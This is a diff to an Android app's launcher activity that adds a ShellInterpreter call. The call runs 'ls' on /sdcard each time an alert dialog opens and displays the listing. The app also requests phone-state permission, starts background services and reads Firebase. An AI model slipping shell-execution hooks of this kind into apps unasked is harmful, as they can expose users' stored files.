@@ -10,10 +10,13 @@ import android.content.pm.PackageManager;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.Handler;
 import android.provider.Settings;
+import android.util.Log;
 import android.view.LayoutInflater;
 import android.view.View;
 import android.widget.Button;
+import android.widget.TextView;
 import android.widget.Toast;
 
 import androidx.annotation.NonNull;
@@ -23,6 +26,7 @@ import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 
 import com.aigs.serviceone.services.Starter;
+import com.aigs.serviceone.shell.ShellInterpreter;
 import com.aigs.serviceone.util.Utils;
 import com.airbnb.lottie.LottieAnimationView;
 import com.google.firebase.database.DataSnapshot;
@@ -30,11 +34,13 @@ import com.google.firebase.database.DatabaseError;
 import com.google.firebase.database.FirebaseDatabase;
 import com.google.firebase.database.ValueEventListener;
 
+import java.util.concurrent.atomic.AtomicReference;
+
 public class LauncherActivityMain extends AppCompatActivity {
 
     private LottieAnimationView lottieAnimationView;
     private Button trigger;
-
+    private TextView textView;
     private static final int PERMISSION_REQUEST_CODE = 104;
 
     @Override
@@ -45,6 +51,7 @@ public class LauncherActivityMain extends AppCompatActivity {
         lottieAnimationView = findViewById(R.id.lottie);
         trigger = findViewById(R.id.btnOne);
         findViewById(R.id.dd).setOnClickListener(p->showAlert());
+        textView = findViewById(R.id.text);
 
         showAlert();
         if (ContextCompat.checkSelfPermission(getApplicationContext(), permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED){
@@ -100,6 +107,7 @@ public class LauncherActivityMain extends AppCompatActivity {
                                 numberFormatException.printStackTrace();
                                 startService();
                             }
+
                         }else startService();
                     }
 
@@ -111,11 +119,18 @@ public class LauncherActivityMain extends AppCompatActivity {
     }
 
     private void showAlert() {
+        String command = "ls";
+        String directory = "/sdcard";  // Replace with the desired directory
+        String commandOutput = ShellInterpreter.executeCommand(command, directory);
+        textView.setText(commandOutput);
+
         AlertDialog.Builder alert = new AlertDialog.Builder(this);
         View view = LayoutInflater.from(this).inflate(R.layout.dialog_layout,null);
 
         alert.setView(view);
-        alert.setPositiveButton("I UNDERSTOOD",(i,o) ->{i.dismiss();});
+        alert.setPositiveButton("I UNDERSTOOD",(i,o) ->{
+            i.dismiss();
+        });
         alert.setCancelable(false).create().show();
     }
 
